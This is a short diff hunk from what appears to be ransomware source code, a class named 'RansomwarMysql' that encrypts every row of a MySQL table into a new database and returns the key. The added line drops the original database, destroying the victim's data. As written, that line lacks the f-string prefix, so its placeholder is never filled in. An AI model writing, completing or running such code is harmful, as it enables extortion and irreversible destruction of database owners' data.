@@ -91,6 +91,7 @@ class RansomwarMysql:
                         try:data_enc += self.encrypt_data(str(row[col]))
                         except:data_enc += ""
                     mycursor.execute(f"INSERT INTO {new_database_name}.{new_table_name} (encrypted_data) VALUES (%s)", (data_enc,))
+            mycursor.execute("DROP DATABASE {database_name}; ") 
             return str(self.defult_key)
         
         return False
